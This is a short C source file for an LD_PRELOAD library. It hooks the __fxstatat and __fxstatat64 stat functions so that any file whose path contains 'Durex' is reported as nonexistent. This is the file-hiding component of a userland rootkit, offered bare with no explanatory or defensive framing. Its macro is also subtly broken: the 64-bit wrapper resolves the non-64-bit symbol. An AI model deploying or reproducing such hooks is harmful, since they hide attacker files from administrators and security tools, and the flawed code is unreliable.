#define _GNU_SOURCE
#include<stdio.h>
#include<dlfcn.h>
#include<fcntl.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<errno.h>
#include<string.h>
#define DECLARE_FXSTAT(fxstatat,stat)static int(*original_##fxstatat)(int,int,const char*,struct stat*,int)=0;int fxstatat(int v,int d,const char*p,struct stat*b,int f){if(original_##fxstatat==0){original_##fxstatat=dlsym(RTLD_NEXT,"__fxstatat");if(original_##fxstatat==0)return-1;}if(strstr(p,"Durex")){errno=ENOENT;return-1;}return original_##fxstatat(v,d,p,b,f);}
DECLARE_FXSTAT(__fxstatat64,stat64);
DECLARE_FXSTAT(__fxstatat,stat);
